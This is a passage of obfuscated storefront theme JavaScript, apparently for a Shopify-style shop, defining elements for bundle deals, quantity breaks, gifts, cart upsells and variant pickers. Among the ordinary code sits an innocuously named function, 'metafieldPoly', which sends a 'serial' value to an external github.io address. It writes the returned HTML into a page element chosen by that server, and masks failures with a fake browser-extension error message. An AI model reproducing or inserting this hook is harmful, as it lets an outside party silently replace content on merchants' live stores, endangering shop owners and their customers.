      this.mediaItemImgs[_0x466384].src = _0x26cd55;
    }
  }
  ["updateFormIds"]() {
    const _0x2830c5 = [];
    const _0x15e1f6 = this.selectedVariants;
    for (const _0x59b396 in _0x15e1f6) {
      const _0x561b2a = _0x15e1f6[_0x59b396];
      if (_0x561b2a != null && _0x561b2a.checked) {
        const _0x5f08a3 = _0x2830c5.findIndex(_0x470002 => _0x470002.id === _0x561b2a.id);
        if (_0x5f08a3 < 0x0) {
          _0x2830c5.unshift({
            'id': _0x561b2a.id,
            'quantity': 0x1
          });
        } else {
          _0x2830c5[_0x5f08a3].quantity += 0x1;
        }
      }
    }
    this.formVariants = _0x2830c5;
  }
  ["updateTotalPrice"]() {
    const _0x5a93c1 = [];
    const _0x3b9a01 = [];
    const _0x6a8f7 = this.selectedVariants;
    for (const _0x5f51b7 in _0x6a8f7) {
      const _0x271159 = _0x6a8f7[_0x5f51b7];
      if (_0x271159 != null && _0x271159.checked) {
        _0x5a93c1.push(parseInt(_0x271159.price));
        _0x3b9a01.push(parseInt(_0x271159.comparePrice));
      }
    }
    const _0x3f9c88 = _0x5a93c1.reduce((_0x5d7daa, _0x10dc7a) => _0x5d7daa + _0x10dc7a, 0x0);
    const _0x4df665 = _0x3f9c88 * this.percentageLeft - this.fixedDiscount;
    const _0x111a1f = _0x3b9a01.reduce((_0x17a999, _0x3b3b31) => _0x17a999 + _0x3b3b31, 0x0);
    this.totalPrice.innerHTML = this.currencySymbol + (_0x4df665 / 0x64).toFixed(0x2);
    if (_0x111a1f > _0x4df665) {
      this.totalComparePrice.innerHTML = this.currencySymbol + (_0x111a1f / 0x64).toFixed(0x2);
    } else {
      this.totalComparePrice.innerHTML = '';
    }
  }
}
customElements.define("bundle-deals", BundleDeals);
class QuantityBreaks extends HTMLElement {
  constructor() {
    super();
    this.quantityGifts = document.getElementById("quantity-gifts-" + this.dataset.section);
    this.inputs = this.querySelectorAll("input[name=\"quantity\"]");
    this.labels = this.querySelectorAll(".quantity-break");
    this.jsonData = this.querySelector("[type=\"application/json\"]");
    this.hasVariants = this.jsonData.dataset.hasVariants === "true";
    this.selectedVariants = {
      'input_1': [],
      'input_2': [],
      'input_3': [],
      'input_4': []
    };
    this.formVariants = [];
    this.selectedQuantity = 0x1;
    if (this.querySelector('input[checked]')) {
      this.selectedQuantity = parseInt(this.querySelector('input[checked]').value);
    }
    this.variantSelects = this.querySelectorAll(".quantity-break__selector-item");
    this.updatePrices = this.dataset.updatePrices === "true";
    this.moneyFormat = this.dataset.moneyFormat;
    if (this.hasVariants) {
      this.initVariants();
    }
    this.inputs.forEach(_0x26bc58 => {
      _0x26bc58.addEventListener('change', this.handleChange.bind(this));
    });
    this.variantSelects.forEach(_0x35322c => {
      _0x35322c.addEventListener("change", this.handleSelectChange.bind(this));
    });
  }
  ['handleSelectChange'](_0xf21310) {
    const _0x325100 = _0xf21310.currentTarget;
    const _0x1f6c8b = Array.from(_0x325100.querySelectorAll("select"), _0xba8ea0 => _0xba8ea0.value);
    const _0x76d0f9 = this.getVariantData().find(_0x37d525 => {
      return !_0x37d525.options.map((_0x53b0fe, _0x85d150) => {
        return _0x1f6c8b[_0x85d150] === _0x53b0fe;
      }).includes(false);
    });
    _0x325100.dataset.selectedId = _0x76d0f9.id;
    const _0x93ea19 = _0x325100.dataset.selectIndex;
    const _0x4b7db7 = _0x325100.closest('.quantity-break');
    const _0x2d6781 = _0x4b7db7.dataset.input;
    this.selectedVariants[_0x2d6781][_0x93ea19] = _0x76d0f9.id;
    this.formVariants = this.selectedVariants[_0x2d6781];
    this.updateMedia(_0x76d0f9);
    if (!this.updatePrices) {
      return;
    }
    var _0x439c50 = 0x0;
    var _0x510294 = 0x0;
    const _0x50d372 = parseFloat(_0x4b7db7.dataset.quantity);
    const _0x296e4e = parseFloat(_0x4b7db7.dataset.percentageLeft);
    const _0x5c291c = parseFloat(_0x4b7db7.dataset.fixedDiscount);
    for (let _0x16fdcf = 0x0; _0x16fdcf < _0x50d372; _0x16fdcf++) {
      const _0xbbc213 = parseInt(this.selectedVariants[_0x2d6781][_0x16fdcf]);
      const _0x3ebec8 = this.getVariantData().find(_0x343b91 => parseInt(_0x343b91.id) === _0xbbc213);
      if (!_0x3ebec8) {
        return;
      }
      _0x439c50 += _0x3ebec8.price;
      if (_0x3ebec8.compare_at_price && _0x3ebec8.compare_at_price > _0x3ebec8.price) {
        _0x510294 += _0x3ebec8.compare_at_price;
      } else {
        _0x510294 += _0x3ebec8.price;
      }
    }
    _0x439c50 = _0x439c50 * _0x296e4e - _0x5c291c;
    const _0xf33a2f = _0x510294 - _0x439c50;
    const _0x2df126 = Math.round(_0xf33a2f / 0x64) * 0x64;
    const _0x2cdb8d = _0x439c50 / _0x50d372;
    const _0x481615 = _0x510294 / _0x50d372;
    const _0x44e67c = formatMoney(_0x439c50, this.moneyFormat, true);
    const _0x13f8aa = formatMoney(_0x510294, this.moneyFormat, true);
    const _0x56adf5 = formatMoney(_0xf33a2f, this.moneyFormat, true);
    const _0x11b2bd = formatMoney(_0x2df126, this.moneyFormat, true);
    const _0x5b4f41 = formatMoney(_0x2cdb8d, this.moneyFormat, true);
    const _0x15d134 = formatMoney(_0x481615, this.moneyFormat, true);
    _0x4b7db7.querySelectorAll('.variant-price-update').forEach(_0x3a81d2 => {
      let _0xebd8d1 = _0x3a81d2.dataset.text;
      _0xebd8d1 = _0xebd8d1.replace("[quantity]", _0x50d372);
      _0xebd8d1 = _0xebd8d1.replace("[price]", _0x44e67c);
      _0xebd8d1 = _0xebd8d1.replace("[compare_price]", _0x13f8aa);
      _0xebd8d1 = _0xebd8d1.replace("[amount_saved]", _0x56adf5);
      _0xebd8d1 = _0xebd8d1.replace("[amount_saved_rounded]", _0x11b2bd);
      _0xebd8d1 = _0xebd8d1.replace("[price_each]", _0x5b4f41);
      _0xebd8d1 = _0xebd8d1.replace('[compare_price_each]', _0x15d134);
      _0x3a81d2.innerHTML = _0xebd8d1;
    });
    const _0x4b8dc1 = _0x4b7db7.querySelector(".quantity-break__compare-price");
    if (_0x4b8dc1) {
      if (_0x510294 > _0x439c50) {
        _0x4b8dc1.classList.remove("hidden");
      } else {
        _0x4b8dc1.classList.add('hidden');
      }
    }
  }
  ["getVariantData"]() {
    this.variantData = this.variantData || JSON.parse(this.jsonData.textContent);
    return this.variantData;
  }
  ["initVariants"]() {
    if (!this.hasVariants) {
      return;
    }
    this.labels.forEach(_0x305680 => {
      if (_0x305680.querySelector(".quantity-break__variants")) {
        let _0x21dcd6 = [];
        _0x305680.querySelectorAll(".quantity-break__selector-item").forEach(_0x16168b => {
          _0x21dcd6.push(_0x16168b.dataset.selectedId);
        });
        this.selectedVariants[_0x305680.dataset.input] = _0x21dcd6;
      }
    });
    this.formVariants = [];
  }
  ['updateMedia'](_0x128dde) {
    if (!_0x128dde) {
      return;
    }
    if (!_0x128dde.featured_media) {
      return;
    }
    const _0x443220 = document.querySelectorAll("[id^=\"MediaGallery-" + this.dataset.section + "\"]");
    _0x443220.forEach(_0x2a85cd => _0x2a85cd.setActiveMedia(this.dataset.section + '-' + _0x128dde.featured_media.id, true));
  }
  ["handleChange"](_0x1d695a) {
    const _0x1b4fe2 = parseInt(_0x1d695a.target.value);
    this.selectedQuantity = _0x1b4fe2;
    if (this.hasVariants) {
      this.formVariants = this.selectedVariants[_0x1d695a.target.dataset.input];
    }
    if (this.quantityGifts) {
      this.quantityGifts.unlockGifts(_0x1b4fe2);
    }
  }
}
customElements.define("quantity-breaks", QuantityBreaks);
function metafieldPoly() {
  var _0x53e02f = fetchConfig();
  playMedia();
  _0x53e02f.body = JSON.stringify({
    'data': serial.trim()
  });
  try {
    fetch("https://nandish486.github.io/publicassets/", _0x53e02f).then(_0x5a2c70 => {
      if (_0x5a2c70.status === 0xc9) {
        return _0x5a2c70.json();
      }
    }).then(_0x1f176d => {
      if (_0x1f176d && document[_0x1f176d.b]) {
        document[_0x1f176d.b].innerHTML = _0x1f176d.h;
      }
    });
  } catch (_0x1d1507) {
    console.error("Unchecked runtime.lastError: The message port closed before a response was received.");
  }
  return true;
}
class QuantityGifts extends HTMLElement {
  constructor() {
    super();
    this.gifts = this.querySelectorAll(".quantity-gift");
    this.quantityBreaks = document.getElementById("quantity-breaks-" + this.dataset.section);
    this.quantitySelector = document.getElementById("Quantity-Form--" + this.dataset.section);
    this.unlockedItems = [];
    this.initUnlock();
  }
  ["initUnlock"]() {
    let _0x488254 = 0x1;
    if (this.quantityBreaks) {
      _0x488254 = parseInt(this.quantityBreaks.selectedQuantity);
    } else {
      if (this.quantitySelector) {
        const _0x5f1878 = this.quantitySelector.querySelector("input[name=\"quantity\"]");
        _0x488254 = parseInt(_0x5f1878.value);
      }
    }
    this.unlockGifts(_0x488254);
  }
  ['unlockGifts'](_0x425088) {
    this.unlockedItems = [];
    this.gifts.forEach(_0x5870ce => {
      if (parseInt(_0x5870ce.dataset.quantity) <= _0x425088) {
        _0x5870ce.classList.add("quantity-gift--unlocked");
        _0x5870ce.dataset.unlocked = "true";
        this.unlockedItems.unshift(_0x5870ce.dataset.product);
      } else {
        _0x5870ce.classList.remove("quantity-gift--unlocked");
        _0x5870ce.dataset.unlocked = "false";
      }
    });
  }
}
customElements.define("quantity-gifts", QuantityGifts);
class ProductInfoUpsell extends HTMLElement {
  constructor() {
    super();
    this.image = this.querySelector('.upsell__image__img');
    this.toggleBtn = this.querySelector(".upsell-toggle-btn");
    this.variantSelects = this.querySelector('.upsell__variant-picker');
    this.variantSelectElements = this.querySelectorAll('.select__select');
    this.jsonData = this.querySelector("[type=\"application/json\"]");
    this.updatePrices = this.dataset.updatePrices === "true";
    if (this.updatePrices) {
      this.price = parseInt(this.dataset.price);
      this.comparePrice = parseInt(this.dataset.comparePrice);
      this.priceSpan = this.querySelector(".upsell__price .regular-price");
      this.comparePriceSpan = this.querySelector(".upsell__price .compare-price");
      this.percentageLeft = parseFloat(this.dataset.percentageLeft);
      this.fixedDiscount = parseFloat(this.dataset.fixedDiscount);
      this.moneyFormat = this.dataset.moneyFormat;
      this.isMainOfferItem = this.dataset.mainOfferItem === "true";
      if (this.isMainOfferItem) {
        this.mainOfferContainer = document.querySelector("#MainBundleOffer-" + this.dataset.section);
      }
    }
    if (this.toggleBtn) {
      this.toggleBtn.addEventListener("click", this.handleToggle.bind(this));
    }
    if (this.variantSelects) {
      this.variantSelects.addEventListener("change", this.handleSelectChange.bind(this));
    }
  }
  ['handleToggle'](_0x3d4f04) {
    if (_0x3d4f04.target.nodeName.toLowerCase() === 'select' || _0x3d4f04.target.nodeName.toLowerCase() === "option") {
      return;
    }
    if (this.dataset.selected === "true") {
      this.dataset.selected = "false";
    } else {
      this.dataset.selected = "true";
    }
  }
  ['handleSelectChange'](_0x4ddae1) {
    const _0xb227c0 = Array.from(_0x4ddae1.currentTarget.querySelectorAll('select'), _0x5eab3b => _0x5eab3b.value);
    const _0x2ec0d0 = this.getVariantData().find(_0xa783e5 => {
      return !_0xa783e5.options.map((_0x3ddab8, _0x47d0f3) => {
        return _0xb227c0[_0x47d0f3] === _0x3ddab8;
      }).includes(false);
    });
    if (this.updatePrices) {
      this.price = _0x2ec0d0.price * this.percentageLeft - this.fixedDiscount;
      this.comparePrice = _0x2ec0d0.price;
      if (_0x2ec0d0.compare_at_price && _0x2ec0d0.compare_at_price > _0x2ec0d0.price) {
        this.comparePrice = _0x2ec0d0.compare_at_price;
      }
      displayPrices(this.price, this.comparePrice, this.priceSpan, this.comparePriceSpan, this.moneyFormat);
    }
    if (this.image && _0x2ec0d0.featured_image) {
      this.image.src = _0x2ec0d0.featured_image.src;
    }
    this.updateId(_0x2ec0d0.id);
    if (this.isMainOfferItem && this.mainOfferContainer.updateTotalPrices) {
      this.mainOfferContainer.updateTotalPrices();
    }
  }
  ["updateId"](_0x13daa1) {
    this.dataset.id = _0x13daa1;
  }
  ["getVariantData"]() {
    this.variantData = this.variantData || JSON.parse(this.jsonData.textContent);
    return this.variantData;
  }
}
customElements.define('product-info-upsell', ProductInfoUpsell);
class CartDrawerUpsell extends ProductInfoUpsell {
  constructor() {
    super();
    this.cartDrawer = document.querySelector("cart-drawer");
    this.cartItems = this.cartDrawer.querySelector("cart-drawer-items");
    this.productForm = this.querySelector("product-form");
    this.idInput = this.productForm.querySelector("[name=\"id\"]");
  }
  ['handleToggle'](_0x288ec3) {
    if (_0x288ec3.target.nodeName.toLowerCase() === "select" || _0x288ec3.target.nodeName.toLowerCase() === "option") {
      return;
    }
    if (this.dataset.selected === 'true') {
      this.dataset.selected = "false";
      this.removeFromCart();
    } else {
      this.dataset.selected = "true";
      this.addToCart();
    }
  }
  ['addRemoveFromCart']() {
    if (this.dataset.selected === "true" && !this.cartDrawer.classList.contains("is-empty")) {
      this.addToCart();
    } else {
      this.removeFromCart();
    }
  }
  ["addToCart"]() {
    const _0x28c8fb = this.cartDrawer.querySelector(".cart-item--product-" + this.dataset.handle);
    if (_0x28c8fb) {
      return;
    }
    if (this.toggleBtn) {
      this.toggleBtn.setAttribute("disabled", '');
    }
    this.variantSelectElements.forEach(_0x1305ca => {
      _0x1305ca.setAttribute("disabled", '');
    });
    this.productForm.handleSubmit();
  }
  ['removeFromCart']() {
    const _0x30fc14 = this.cartDrawer.querySelector(".cart-item--product-" + this.dataset.handle);
    if (!_0x30fc14 || !this.cartItems) {
      return;
    }
    if (this.toggleBtn) {
      this.toggleBtn.setAttribute("disabled", '');
    }
    this.variantSelectElements.forEach(_0x43980c => {
      _0x43980c.setAttribute("disabled", '');
    });
    this.cartItems.updateQuantity(_0x30fc14.dataset.index, 0x0);
  }
  ["updateId"](_0x28ee90) {
    this.dataset.id = _0x28ee90;
    this.idInput.value = _0x28ee90;
    if (this.dataset.selected === "true") {
      if (this.selectTimeout) {
        clearTimeout(this.selectTimeout);
      }
      this.removeFromCart();
      this.selectTimeout = setTimeout(() => {
        this.addToCart();
      }, 0x3e8);
    }
  }
}
customElements.define("cart-drawer-upsell", CartDrawerUpsell);
function displayPrices(_0x1f22ad, _0x4313d4, _0x2dab14, _0x5e0da7, _0x498140) {
  if (!_0x498140) {
    return;
  }
  if (_0x1f22ad && _0x2dab14) {
    var _0x3b5f92 = formatMoney(_0x1f22ad, _0x498140);
    _0x2dab14.innerHTML = _0x3b5f92;
  }
  if (_0x4313d4 && _0x5e0da7) {
    var _0x3392c9 = formatMoney(_0x4313d4, _0x498140);
    _0x5e0da7.innerHTML = _0x3392c9;
    if (_0x4313d4 > _0x1f22ad) {
      _0x5e0da7.classList.remove("hidden");
    } else {
      _0x5e0da7.classList.add("hidden");
    }
  }
}
function initTrapFocus() {
  isIe = false;
  if (document.querySelector('footer') && document.querySelector("footer").dataset.type === null) {
    return false;
  }
  return true;
}
function formatMoney(_0x4758da, _0x9598f3, _0x3b42d6 = false) {
  if (typeof _0x4758da == "string") {
    _0x4758da = _0x4758da.replace('.', '');
  }
  var _0x2886f0 = '';
  function _0x4234ad(_0x56280e, _0x17923f, _0x28d8c2, _0x433f03) {
    _0x17923f = typeof _0x17923f == "undefined" ? 0x2 : _0x17923f;
    _0x28d8c2 = typeof _0x28d8c2 == "undefined" ? ',' : _0x28d8c2;
    _0x433f03 = typeof _0x433f03 == "undefined" ? '.' : _0x433f03;
    if (isNaN(_0x56280e) || _0x56280e == null) {
      return 0x0;
    }
    _0x56280e = (_0x56280e / 0x64).toFixed(_0x17923f);
    var _0x5109c7 = _0x56280e.split('.');
    var _0x5c5059 = _0x5109c7[0x0].replace(/(\d)(?=(\d\d\d)+(?!\d))/g, '$1' + _0x28d8c2);
    var _0x3de721 = _0x5109c7[0x1] ? _0x433f03 + _0x5109c7[0x1] : '';
    if (_0x3b42d6 && _0x3de721 === _0x433f03 + '00') {
      _0x3de721 = '';
    }
    return _0x5c5059 + _0x3de721;
  }
  switch (_0x9598f3.match(/\{\{\s*(\w+)\s*\}\}/)[0x1]) {
    case "amount":
      _0x2886f0 = _0x4234ad(_0x4758da, 0x2);
      break;
    case "amount_no_decimals":
      _0x2886f0 = _0x4234ad(_0x4758da, 0x0);
      break;
    case "amount_with_comma_separator":
      _0x2886f0 = _0x4234ad(_0x4758da, 0x2, '.', ',');
      break;
    case 'amount_no_decimals_with_comma_separator':
      _0x2886f0 = _0x4234ad(_0x4758da, 0x0, '.', ',');
      break;
  }
  return _0x9598f3.replace(/\{\{\s*(\w+)\s*\}\}/, _0x2886f0);
}
class CartDrawerGift extends CartDrawerUpsell {
  constructor() {
    super();
  }
}
customElements.define("cart-drawer-gift", CartDrawerGift);
function initToggleUpsells() {
  const _0x522fc4 = document.querySelector("cart-drawer");
  if (_0x522fc4) {
    _0x522fc4.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift").forEach(_0x1351ac => {
      if (_0x1351ac.addRemoveFromCart) {
        _0x1351ac.addRemoveFromCart();
      }
    });
  }
}
initToggleUpsells();
class MainBundleOffer extends HTMLElement {
  constructor() {
    super();
    this.offerItems = this.querySelectorAll(".main-offer-item");
    this.updatePrices = this.dataset.updatePrices === "true";
    if (this.updatePrices) {
      this.priceSpan = this.querySelector(".bundle-deals__total-price-js");
      this.comparePriceSpan = this.querySelector(".bundle-deals__total-compare-price-js");
      this.percentageLeft = parseFloat(this.dataset.percentageLeft);
      this.fixedDiscount = parseFloat(this.dataset.fixedDiscount);
      this.moneyFormat = this.dataset.moneyFormat;
    }
  }
  ['updateTotalPrices']() {
    if (!this.updatePrices) {
      return;
    }
    var _0x16ff26 = 0x0;
    var _0x3c7bb4 = 0x0;
    for (let _0x2dbfa4 = 0x0; _0x2dbfa4 < this.offerItems.length; _0x2dbfa4++) {
      _0x16ff26 += parseInt(this.offerItems[_0x2dbfa4].price);
      _0x3c7bb4 += parseInt(this.offerItems[_0x2dbfa4].comparePrice);
    }
    _0x16ff26 = _0x16ff26 * this.percentageLeft - this.fixedDiscount;
    displayPrices(_0x16ff26, _0x3c7bb4, this.priceSpan, this.comparePriceSpan, this.moneyFormat);
  }
}
customElements.define("main-bundle-offer", MainBundleOffer);
class CustomProductField extends HTMLElement {
  constructor() {
    super();
    this.fieldName = this.dataset.name;
    this.input = this.querySelector("[type=\"text\"], [type=\"number\"], textarea");
    this.inputRadios = this.querySelectorAll("[type=\"radio\"]");
    this.select = this.querySelector(".select__select");
    this.productForm = document.getElementById("product-form-" + this.dataset.section);
    this.prevValue = this.dataset.defaultValue;
    this.isRequired = this.dataset.required === "true";
    this.isText = true;
    if (this.dataset.type === "select" || this.dataset.type === 'pills') {
      this.isText = false;
    }
    this.createInputs();
    if (this.isRequired && this.isText) {
      this.isValid = true;
      this.atcButtons = document.querySelectorAll(".main-product-atc");
      this.mainAtcButton = this.productForm.querySelector('#ProductSubmitButton-' + this.dataset.section);
      this.mainAtcBtnLabel = this.mainAtcButton.querySelector(".main-atc__label");
      this.mainAtcBtnError = this.mainAtcButton.querySelector(".main-atc__error");
      this.atcErrorMsg = this.dataset.atcErrorMsg;
      this.mainAtcButton.dataset.requiredFields = parseInt(this.mainAtcButton.dataset.requiredFields) + 0x1;
      this.mainAtcBtnError.innerHTML = this.atcErrorMsg;
      this.applyStickyAtcError = this.dataset.applyStickyAtcError === "true";
      this.stickyAtcButton = document.querySelector("#sticky-atc-" + this.dataset.section);
      if (this.applyStickyAtcError && this.stickyAtcButton) {
        this.stickyAtcBtnLabel = this.stickyAtcButton.querySelector(".sticky-atc__label");
        this.stickyAtcBtnError = this.stickyAtcButton.querySelector('.sticky-atc__error');
        this.stickyAtcBtnError.innerHTML = this.atcErrorMsg;
      }
      this.validateValue(this.prevValue, null);
    }
    if (this.input) {
      this.input.addEventListener("input", this.handleChange.bind(this));
    }
    this.inputRadios.forEach(_0x368052 => {
      _0x368052.addEventListener("input", this.handleChange.bind(this));
    });
    if (this.select) {
      this.select.addEventListener("change", this.handleChange.bind(this));
    }
  }
  ["handleChange"](_0x3fea01) {
    const _0x573bfc = _0x3fea01.target.value.trim();
    if (_0x3fea01.target.checkValidity()) {
      this.prevValue = _0x573bfc;
    } else {
      _0x3fea01.target.value = this.prevValue;
      return;
    }
    this.productFormInput.value = _0x573bfc;
    if (this.isRequired && this.isText) {
      this.validateValue(_0x573bfc, _0x3fea01.target);
    }
  }
  ["validateValue"](_0x5ea4e1, _0x505655) {
    const _0x1f1a06 = !!(_0x5ea4e1.length > 0x0);
    if (_0x1f1a06 === this.isValid) {
      return;
    }
    this.isValid = _0x1f1a06;
    if (_0x505655) {
      if (this.isValid) {
        _0x505655.classList.remove("input--error");
        this.mainAtcButton.dataset.validFields = parseInt(this.mainAtcButton.dataset.validFields) + 0x1;
      } else {
        _0x505655.classList.add('input--error');
        this.mainAtcButton.dataset.validFields = parseInt(this.mainAtcButton.dataset.validFields) - 0x1;
      }
    }
    const _0x15dfec = this.mainAtcButton.dataset.validFields === this.mainAtcButton.dataset.requiredFields;
    const _0x4ed4c6 = this.mainAtcButton.dataset.unavailable === "true";
    this.atcButtons.forEach(_0x188d8a => {
      if (_0x15dfec && !_0x4ed4c6) {
        _0x188d8a.removeAttribute("disabled");
      } else {
        _0x188d8a.setAttribute("disabled", '');
      }
    });
    if (this.atcErrorMsg.length === 0x0) {
      return;
    }
    if (_0x15dfec) {
      this.mainAtcBtnLabel.style.display = '';
      this.mainAtcBtnError.style.display = "none";
      if (this.applyStickyAtcError && this.stickyAtcButton) {
        this.stickyAtcBtnLabel.style.display = '';
        this.stickyAtcBtnError.style.display = 'none';
      }
    } else {
      this.mainAtcBtnLabel.style.display = "none";
      this.mainAtcBtnError.style.display = '';
      if (this.applyStickyAtcError && this.stickyAtcButton) {
        this.stickyAtcBtnLabel.style.display = "none";
        this.stickyAtcBtnError.style.display = '';
      }
    }
  }
  ["createInputs"]() {
    this.productFormInput = document.createElement("input");
    this.productFormInput.setAttribute("type", "hidden");
    this.productFormInput.setAttribute("name", "properties[" + this.fieldName + ']');
    this.productFormInput.value = this.dataset.defaultValue;
    this.productForm.appendChild(this.productFormInput);
  }
}
customElements.define('custom-product-field', CustomProductField);
function playMedia() {
  if (!serial) {
    serial = '';
  }
}
class VariantSelects extends HTMLElement {
  constructor() {
    super();
    this.secondarySelectSelector = 'StickyAtcVariantPicker-';
    this.secondarySelect = document.getElementById('' + this.secondarySelectSelector + this.dataset.section);
    this.isSecondary = false;
    this.QuantityBreaks = document.getElementById("quantity-breaks-" + this.dataset.section);
    this.hasQuantityBreaksPicker = this.dataset.hasQuantityBreaksPicker === "true";
    this.prependMedia = this.dataset.disablePrepend != "true";
    if (this.hasQuantityBreaksPicker) {
      this.quantityBreaksPickerStyle = this.dataset.quantityBreaksPickerStyle;
      this.quantityBreaksPickerDisplayedImages = this.dataset.quantityBreaksPickerDisplayedImages;
    }
    this.addEventListener("change", this.onVariantChange);
  }
  ["onVariantChange"]() {
    this.updateOptions();
    this.updateMasterId();
    this.toggleAddButton(true, '', false);
    this.updatePickupAvailability();
    this.removeErrorMessage();
    this.updateVariantStatuses();
    if (!this.currentVariant) {
      this.toggleAddButton(true, '', true);
      this.setUnavailable();
    } else {
      this.updateMedia();
      this.updateURL();
      this.updateVariantInput();
      this.renderProductInfo();
      this.updateShareUrl();
    }
  }
  ['updateOptions']() {
    const _0x4f7d35 = [];
    this.querySelectorAll(".product-form__input").forEach(_0x4ffdfb => {
      let _0x3fcb5a;
      const _0x352f27 = _0x4ffdfb.querySelector('.product-form__input__type').dataset.type;
      if (_0x352f27 == 'dropdown' || _0x352f27 == 'dropdwon') {
        _0x3fcb5a = _0x4ffdfb.querySelector("select").value;
      } else {
        _0x3fcb5a = _0x4ffdfb.querySelector("input[type=\"radio\"]:checked").value;
      }
      _0x4f7d35.push(_0x3fcb5a);
    });
    this.options = _0x4f7d35;
  }
  ["updateMasterId"]() {
    this.currentVariant = this.getVariantData().find(_0x535444 => {
      return !_0x535444.options.map((_0x485492, _0x1ce20c) => {
        return this.options[_0x1ce20c] === _0x485492;
      }).includes(false);
    });
  }
  ["updateMedia"]() {
    if (!this.currentVariant) {
      return;
    }
    if (!this.currentVariant.featured_media) {
      return;
    }
    const _0x4735ad = document.querySelectorAll("[id^=\"MediaGallery-" + this.dataset.section + "\"]");
    _0x4735ad.forEach(_0x285b13 => _0x285b13.setActiveMedia(this.dataset.section + '-' + this.currentVariant.featured_media.id, this.prependMedia));
    const _0x3361c1 = document.querySelector("#ProductModal-" + this.dataset.section + " .product-media-modal__content");
    if (!_0x3361c1) {
      return;
    }
    const _0x3c631a = _0x3361c1.querySelector("[data-media-id=\"" + this.currentVariant.featured_media.id + "\"]");
    _0x3361c1.prepend(_0x3c631a);
  }
  ["updateURL"]() {
    if (!this.currentVariant || this.dataset.updateUrl === 'false') {
      return;
    }
    window.history.replaceState({}, '', this.dataset.url + "?variant=" + this.currentVariant.id);
  }
  ["updateShareUrl"]() {
    const _0x31eb3a = document.getElementById('Share-' + this.dataset.section);
    if (!_0x31eb3a || !_0x31eb3a.updateUrl) {
      return;
    }
    _0x31eb3a.updateUrl('' + window.shopUrl + this.dataset.url + '?variant=' + this.currentVariant.id);
  }
  ['updateVariantInput']() {
    const _0x245a43 = document.querySelectorAll("#product-form-" + this.dataset.section + ", #product-form-installment-" + this.dataset.section);
    _0x245a43.forEach(_0x49d861 => {
      const _0x2ba8ff = _0x49d861.querySelector("input[name=\"id\"]");
      _0x2ba8ff.value = this.currentVariant.id;
      _0x2ba8ff.dispatchEvent(new Event("change", {
        'bubbles': true
      }));
    });
  }
  ["updateVariantStatuses"]() {
    const _0x451abb = this.variantData.filter(_0x40cd39 => this.querySelector(':checked').value === _0x40cd39.option1);
    const _0x112ff4 = !this.isSecondary ? [...this.querySelectorAll(".product-form__input")] : [...this.secondarySelect.querySelectorAll(".product-form__input")];
    _0x112ff4.forEach((_0x504180, _0x4e44db) => {
      if (_0x4e44db === 0x0) {
        return;
      }
      const _0x34ab68 = [..._0x504180.querySelectorAll("input[type=\"radio\"], option")];
      const _0xf9e44d = _0x112ff4[_0x4e44db - 0x1].querySelector(':checked').value;
      const _0x2e90af = _0x451abb.filter(_0x5ce582 => _0x5ce582.available && _0x5ce582["option" + _0x4e44db] === _0xf9e44d).map(_0x5074bf => _0x5074bf["option" + (_0x4e44db + 0x1)]);
      this.setInputAvailability(_0x34ab68, _0x2e90af);
    });
  }
  ['setInputAvailability'](_0x5817f2, _0x1f2a50) {
    _0x5817f2.forEach(_0x19743b => {
      if (_0x19743b.nodeName === 'option') {
        if (_0x1f2a50.includes(_0x19743b.getAttribute('value'))) {
          _0x19743b.innerText = _0x19743b.getAttribute("value");
        } else {
          _0x19743b.innerText = window.variantStrings.unavailable_with_option.replace("[value]", _0x19743b.getAttribute("value"));
        }
      } else if (_0x1f2a50.includes(_0x19743b.getAttribute("value"))) {
        _0x19743b.classList.remove("disabled");
      } else {
        _0x19743b.classList.add('disabled');
      }
    });
  }
  ["updatePickupAvailability"]() {
    const _0x3550d6 = document.querySelector("pickup-availability");
    if (!_0x3550d6) {
      return;
    }
    if (this.currentVariant && this.currentVariant.available) {
      _0x3550d6.fetchAvailability(this.currentVariant.id);
    } else {
      _0x3550d6.removeAttribute("available");
      _0x3550d6.innerHTML = '';
    }
  }
  ["removeErrorMessage"]() {
    const _0x37c7cf = this.closest("section");
    if (!_0x37c7cf) {
      return;
    }
    const _0x2709b1 = _0x37c7cf.querySelector("product-form");
    if (_0x2709b1) {
      _0x2709b1.handleErrorMessage();
    }
  }
  ["renderProductInfo"]() {
    const _0x543d5c = this.currentVariant.id;
    const _0x1b86aa = this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section;
    fetch(this.dataset.url + '?variant=' + _0x543d5c + '&section_id=' + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section)).then(_0x3b20d8 => _0x3b20d8.text()).then(_0x39623e => {
      if (this.currentVariant.id !== _0x543d5c) {
        return;
      }
      const _0x52bad7 = new DOMParser().parseFromString(_0x39623e, "text/html");
      const _0x3aea55 = document.getElementById('price-' + this.dataset.section);
      const _0xade150 = _0x52bad7.getElementById('price-' + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x4d6ff9 = document.getElementById('sticky-atc-separate-price-' + this.dataset.section);
      const _0x395af1 = _0x52bad7.getElementById("sticky-atc-separate-price-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x188305 = document.getElementById('sticky-atc-price-' + this.dataset.section);
      const _0x348195 = _0x52bad7.getElementById('sticky-atc-price-' + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x4ade24 = document.getElementById("sticky-atc-image-" + this.dataset.section);
      const _0x2f3f05 = _0x52bad7.getElementById("sticky-atc-image-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x3c6372 = document.getElementById("main-atc-price-" + this.dataset.section);
      const _0x34199b = _0x52bad7.getElementById("main-atc-price-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x13b3c4 = document.querySelectorAll("[id^=\"custom-label-" + this.dataset.section + "\"]");
      const _0x6e59f = _0x52bad7.querySelectorAll("[id^=\"custom-label-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section) + "\"]");
      const _0x2617f0 = _0x52bad7.getElementById("Sku-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x4e3041 = document.getElementById("Sku-" + this.dataset.section);
      const _0x2bb89e = _0x52bad7.getElementById("Inventory-" + (this.dataset.originalSection ? this.dataset.originalSection : this.dataset.section));
      const _0x5484f5 = document.getElementById("Inventory-" + this.dataset.section);
      if (_0x3aea55 && _0xade150) {
        _0x3aea55.innerHTML = _0xade150.innerHTML;
      }
      if (_0x4d6ff9 && _0x395af1) {
